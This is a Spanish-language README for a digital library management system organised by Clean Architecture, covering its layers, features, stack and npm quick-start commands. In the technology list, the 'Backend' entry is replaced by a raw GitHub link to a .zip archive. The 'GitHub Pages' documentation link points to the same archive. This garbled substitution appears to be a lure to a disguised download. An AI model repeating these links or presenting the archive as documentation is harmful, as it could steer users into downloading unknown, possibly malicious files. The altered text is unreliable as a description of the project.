# Sistema de Gestión de Bibliotecas Digitales - Arquitectura Limpia

Este proyecto implementa un sistema de gestión de bibliotecas digitales siguiendo los principios de **Arquitectura Limpia** (Clean Architecture) de Robert C. Martin.

## 🏗️ Arquitectura

El sistema está organizado en capas concéntricas donde las dependencias apuntan hacia el centro:

- **Dominio (Core)**: Entidades y reglas de negocio
- **Aplicación**: Casos de uso y lógica de aplicación
- **Infraestructura**: Implementaciones concretas y adaptadores
- **Presentación**: Interfaces de usuario y controladores

## 📋 Funcionalidades

- ✅ Búsqueda y lectura de libros en línea
- ✅ Gestión de préstamos (físicos y digitales)
- ✅ Historial de préstamos
- ✅ Sistema de reservas
- ✅ Notificaciones de disponibilidad
- ✅ Gestión de usuarios (lectores y administradores)
- ✅ Portal web y API pública
- ✅ Integración con proveedores externos

## 🚀 Tecnologías

- **Backend**: https://raw.githubusercontent.com/Edwinramirezgon/biblioteca-digital-clean-architecture/main/docs/c4-model/architecture-clean-biblioteca-digital-2.7.zip + TypeScript
- **Frontend**: React + TypeScript
- **Base de datos**: PostgreSQL
- **Documentación**: GitHub Pages
- **Arquitectura**: Clean Architecture + C4 Model

## 📖 Documentación

La documentación completa está disponible en [GitHub Pages](https://raw.githubusercontent.com/Edwinramirezgon/biblioteca-digital-clean-architecture/main/docs/c4-model/architecture-clean-biblioteca-digital-2.7.zip)

## 🏃‍♂️ Inicio Rápido

```bash
# Instalar dependencias
npm install

# Ejecutar en desarrollo
npm run dev

# Construir para producción
npm run build
```

## 📁 Estructura del Proyecto

```
src/
├── domain/           # Capa de Dominio
├── application/      # Capa de Aplicación
├── infrastructure/   # Capa de Infraestructura
└── presentation/     # Capa de Presentación
```